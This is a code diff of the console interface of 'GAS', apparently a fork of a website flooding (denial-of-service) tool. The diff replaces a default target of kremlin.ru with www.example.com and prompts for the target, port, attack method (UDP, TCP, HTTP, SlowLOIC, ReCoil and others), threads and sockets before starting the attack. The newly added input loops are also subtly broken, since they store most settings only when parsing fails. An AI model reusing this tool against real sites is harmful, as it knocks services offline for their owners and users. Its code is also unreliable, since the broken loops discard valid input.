@@ -1,16 +1,21 @@
 using System;
 using System.Collections.Generic;
 using System.Timers;
+using System.Text.RegularExpressions;
+
 namespace GAS.TUI
 {
     class Program
     {
         static DateTime d;
-        static string[] Blacklist = new string[] { "epicm.org", "localhost","127.0.0", "192.168."};
+        static string[] Blacklist = new string[] { "epicm.org", "localhost", "127.0.0", "192.168." };
         static GAS.Core.Manager Core = new GAS.Core.Manager();
+        static int num = 1;
         public static void Main(string[] args)
         {
-            try { Console.Title = "GAS for urkaine"; }
+            int tmp_int_parse = 0;
+            bool tmp_bool_parse = false;
+            try { Console.Title = "[GAS] for urkaine :)"; }
             catch { }
             #region Detect oS
             string temp;
@@ -32,50 +37,56 @@ namespace GAS.TUI
 
                 }
             #endregion
-            #region Select target
-            Console.WriteLine("Select target[kremlin.ru]");
-            temp = Console.ReadLine();
-            temp = (temp == "" ? "kremlin.ru" : temp);
-            foreach(string s in Blacklist)
-                if (temp.ToLower().Contains(s))
-                {
-                    Console.WriteLine("U SUK COX");
-                    Environment.Exit(666);
-                }
-            bool IPOK = Core.LockOn(temp);
-            if (!IPOK)
-            {
-                Console.WriteLine("Wrong Target!");
-                Environment.Exit(1);
-            }
+            #region Info
+            Console.ForegroundColor = ConsoleColor.Cyan;
+            Console.WriteLine("###############################################" +
+                              Environment.NewLine +
+                              "#                                             #" +
+                              Environment.NewLine +
+                              "#  GAS 4 anon by http://github.com/kasthack   #" +
+                              Environment.NewLine +
+                              "#                         fork by STAM  1.0   #" +
+                              Environment.NewLine +
+                              "###############################################");
+            Console.ForegroundColor = ConsoleColor.White;
+            Console.WriteLine("Some notes:");
+            Console.WriteLine("1. It is unstable designed fork.");
+            Console.WriteLine("2. Default settings are  in square brackets ");
+            Console.WriteLine("3. Contact us for bugfix.");
+            Console.ForegroundColor = ConsoleColor.Yellow;
+            Console.WriteLine("\t\t\t\t  [Press Enter]");
+            Console.ForegroundColor = ConsoleColor.White;
+            Console.ReadLine();
+            Console.Clear();
             #endregion
-            #region GetParams
-            Console.WriteLine("Subsite is {0}, do you want to change it? [n] (y/n)", Core.Subsite);
-            if (Console.ReadLine().ToLower() == "y")
+            while (!GetHost()) ;
+            #region GetParam
+            if (_q(String.Format("Subsite is {0}, do you want to change it? [n] (y/n)", Core.Subsite)).Trim().ToLower() == "y")
                 Core.Subsite = Console.ReadLine();
-            Console.WriteLine("Enter port[80]");
-            Core.Port = int.Parse((temp = Console.ReadLine()) == "" ? "80" : temp);
-            Console.WriteLine("Select attack type [ReCoil] (UDP|TCP|HTTP|ReCoil|SlowLOIC|RefRef|AhrDosme|Post|TMOF)");
-            Core.Method = (GAS.Core.AttackMethod) Enum.Parse(typeof(GAS.Core.AttackMethod), (temp=Console.ReadLine())==""?"ReCoil":temp);
-            Console.WriteLine("Enter thread count[50]");
-            Core.Threads = int.Parse((temp = Console.ReadLine()) == "" ? "50" : temp);
-            Console.WriteLine("Enter sockets per thread [50]");
-            Core.SPT = int.Parse((temp = Console.ReadLine()) == "" ? "50" : temp);
-            Console.WriteLine("Enter delay [0]");
-            Core.Delay = int.Parse((temp = Console.ReadLine()) == "" ? "0" : temp);
-            Console.WriteLine("Enter timeout[30]");
-            Core.Timeout = int.Parse((temp = Console.ReadLine()) == "" ? "30" : temp);
-            Console.WriteLine("USE Get [true]");
-            Core.USEGet = bool.Parse((temp = Console.ReadLine()) == "" ? "true" : temp);
-            Console.WriteLine("USE GZIP [true]");
-            Core.UseGZIP = bool.Parse((temp = Console.ReadLine()) == "" ? "true" : temp);
-            Console.WriteLine("Wait    For Response [false] ");
-            Core.WaitForResponse = bool.Parse((temp = Console.ReadLine()) == "" ? "false" : temp);
-            Console.WriteLine("Append RANDOMC hars [true]");
-            Core.AppendRANDOMChars = bool.Parse((temp = Console.ReadLine()) == "" ? "true" : temp);
-            Console.WriteLine("Append RANDOM Chars 2 Url [true]");
-            Core.AppendRANDOMCharsUrl = bool.Parse((temp = Console.ReadLine()) == "" ? "true" : temp);
-            Console.WriteLine("Starting attack");
+            while (!int.TryParse((temp = _q("Enter port[80]:")) == "" ? "80" : temp, out tmp_int_parse))
+                _e("Bad port");
+            Core.Port = tmp_int_parse;
+            var mt = typeof(GAS.Core.AttackMethod);
+            Core.Method = (GAS.Core.AttackMethod)Enum.Parse(mt, (temp = _q(String.Format("Select attack type [ReCoil]:\r\n({0})", String.Join("|", Enum.GetNames(mt))))) == "" ? "ReCoil" : temp);
+            while (!int.TryParse((temp = _q("Enter thread count [50]:")) == "" ? "50" : temp, out tmp_int_parse))
+                Core.Threads = tmp_int_parse;
+            while (!int.TryParse((temp = _q("Enter sockets per thread [50]")) == "" ? "50" : temp, out tmp_int_parse))
+                Core.SPT = tmp_int_parse;
+            while (!int.TryParse((temp = _q("Enter delay [0]:")) == "" ? "0" : temp, out tmp_int_parse))
+                Core.Delay = tmp_int_parse;
+            while (!int.TryParse((temp = _q("Enter timeout[30]:")) == "" ? "30" : temp, out tmp_int_parse))
+                Core.Timeout = tmp_int_parse;
+            while (!bool.TryParse((temp = _q("USE Get [true]:")) == "" ? "true" : temp, out tmp_bool_parse))
+                Core.USEGet = tmp_bool_parse;
+            while (!bool.TryParse((temp = _q("USE GZIP [true]:")) == "" ? "true" : temp, out tmp_bool_parse))
+                Core.UseGZIP = tmp_bool_parse;
+            while (!bool.TryParse((temp = _q("Wait For Response [false]:")) == "" ? "false" : temp, out tmp_bool_parse))
+                Core.WaitForResponse = tmp_bool_parse;
+            while (!bool.TryParse((temp = _q("Append RANDOM Chars [true]:")) == "" ? "true" : temp, out tmp_bool_parse))
+                Core.AppendRANDOMChars = tmp_bool_parse;
+            while (!bool.TryParse((temp = _q("Append RANDOM Chars 2 Url [true]:")) == "" ? "true" : temp, out tmp_bool_parse))
+            Core.AppendRANDOMCharsUrl = tmp_bool_parse;
+            Console.WriteLine("Starting attack...");
             #endregion
             #region Start and stop
             Core.Start();
@@ -87,25 +98,65 @@ namespace GAS.TUI
             t.Start();
             //attack started
             #region Cool UI
-                Console.SetCursorPosition(0, 0);
-                Console.WriteLine("GAS 4 anon by github.com/kasthack");
-                Console.WriteLine("+++++++++++++++++++++++++++++++++++++++++++++++");
-                try
-                {
-                    Console.SetCursorPosition(0, 6);
-                }
-                catch { }
-                Console.WriteLine("Attacking...");
-                Console.WriteLine("Press Enter stop attack and exit");
+            Console.SetCursorPosition(0, 0);
+            Console.ForegroundColor = ConsoleColor.Yellow;
+            Console.WriteLine("------------------------------------------------");
+            Console.ForegroundColor = ConsoleColor.Green;
+            try
+            {
+                Console.SetCursorPosition(0, 6);
+            }
+            catch { }
+            Console.ForegroundColor = ConsoleColor.Yellow;
+            Console.WriteLine("------------------------------------------------");
+            Console.ForegroundColor = ConsoleColor.Green;
+            Console.WriteLine("Attacking...");
+            Console.ForegroundColor = ConsoleColor.Yellow;
+
+            Console.ForegroundColor = ConsoleColor.Red;
+            Console.WriteLine("Press Enter stop attack and exit");
+            Console.ForegroundColor = ConsoleColor.Green;
             #endregion
             Console.ReadLine();
-            Console.WriteLine("Exiting, please wait");
+            Console.WriteLine("\r\n\r\n\r\n\r\n------------------------------------------------\r\nExiting, please wait...");
             t.Stop();
             Core.Stop();
             Console.Clear();
             #endregion
         }
-
+        static string _q(string q)
+        {
+            var con_c = Console.ForegroundColor;
+            Console.ForegroundColor = ConsoleColor.Yellow;
+            string s = "";
+            Console.WriteLine("{0}. {1}", num++, q);
+            Console.Write('>');
+            Console.ForegroundColor = con_c;
+            s = Console.ReadLine();
+            return s;
+        }
+        static void _e(string e)
+        {
+            var con_c = Console.ForegroundColor;
+            Console.ForegroundColor = ConsoleColor.Red;
+            Console.WriteLine(e);
+            Console.ForegroundColor = con_c;
+        }
+        static bool GetHost()
+        {
+            string temp = _q("Select target [www.example.com]:");
+            temp = (temp == "" ? "www.example.com" : temp);
+            foreach (string s in Blacklist)
+                if (temp.ToLower().Contains(s))
+                {
+                    _e("[Restricted domain!]");
+                    return false;
+                }
+            bool IPOK = Core.LockOn(temp);
+            if (!IPOK)
+                _e("[Wrong Target!]");
+            return IPOK;
+        }
         static void t_Elapsed(object sender, ElapsedEventArgs argZ)
         {
             int x = Console.CursorLeft, y = Console.CursorTop, w = Console.WindowWidth;
@@ -125,9 +176,11 @@ namespace GAS.TUI
                 Console.SetCursorPosition(0, 3);
             }
             catch { }
+
             Console.WriteLine("Time elapsed\tSent\tReceived\tFailed");
             s = DateTime.Now.Subtract(d).ToString();
             s = s.Substring(0, (ind = s.LastIndexOfAny(new char[] { '.', ',' })) > 0 ? ind : s.Length);
+
             Console.WriteLine("{0}\t{1}\t{2}\t\t{3}", s, Core.Requested, Core.Downloaded, Core.Failed);
         }
     }
